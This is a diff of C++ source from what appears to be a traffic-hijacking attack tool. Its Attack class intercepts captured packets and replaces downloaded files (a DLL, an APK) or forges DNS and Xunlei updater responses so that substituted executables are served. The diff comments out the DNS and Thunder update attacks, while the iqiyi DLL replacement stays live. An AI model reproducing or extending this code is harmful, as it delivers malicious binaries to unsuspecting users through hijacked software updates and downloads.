@@ -22,11 +22,11 @@ Attack::Attack(string path, unsigned long serverIP) {
 
 	gIqiyiDll = new ReplaceNetFile(path + "DownloadHelper.dll", "application/octet-stream");
 
-	gDnsAttack = new DnsAttack(serverIP, "", "");
+	//gDnsAttack = new DnsAttack(serverIP, "", "");
 
-	mQQPim = new ReplaceNetFile(path + "kcsdk.apk", "application/java-archive");
+	//mQQPim = new ReplaceNetFile(path + "kcsdk.apk", "application/java-archive");
 
-	mThunder = new Thunder(serverIP, path, WEIXIN_PC_UPDATE_EXE_FILENAME);
+	//mThunder = new Thunder(serverIP, path, WEIXIN_PC_UPDATE_EXE_FILENAME);
 }
 
 
@@ -47,18 +47,18 @@ int Attack::attack(const char* url, const char* szhost, const char* lphttpdata, 
 	// 		Public::recorduser(((LPIPHEADER)ip)->SrcIP, "iqiyi downloadhelper.dll");
 	// 	}
 	// 
-	else if (strstr(url, "/d?dn="))
-	{
-		iRet = gDnsAttack->sendRespData(pcapT, pData, iCapLen, ip, type, pppoe);
-		//Public::recorduser(((LPIPHEADER)ip)->SrcIP, "dns attack");
-		printf("dns attack\r\n");
-	}
-	else if (strstr(szhost, "upgrade.xl9.xunlei.com") && strstr(url, "/pc?"))
-	{
-		iRet = mThunder->sendRespData(pcapT, pData, iCapLen, ip, type, pppoe);
-		//Public::recorduser(((LPIPHEADER)ip)->SrcIP, "dns attack");
-		printf("Thunder attack\r\n");
-	}
+	//else if (strstr(url, "/d?dn="))
+	//{
+	//	iRet = gDnsAttack->sendRespData(pcapT, pData, iCapLen, ip, type, pppoe);
+	//	//Public::recorduser(((LPIPHEADER)ip)->SrcIP, "dns attack");
+	//	printf("dns attack\r\n");
+	//}
+	//else if (strstr(szhost, "upgrade.xl9.xunlei.com") && strstr(url, "/pc?"))
+	//{
+	//	iRet = mThunder->sendRespData(pcapT, pData, iCapLen, ip, type, pppoe);
+	//	//Public::recorduser(((LPIPHEADER)ip)->SrcIP, "dns attack");
+	//	printf("Thunder attack\r\n");
+	//}
 
 	return 0;
 }
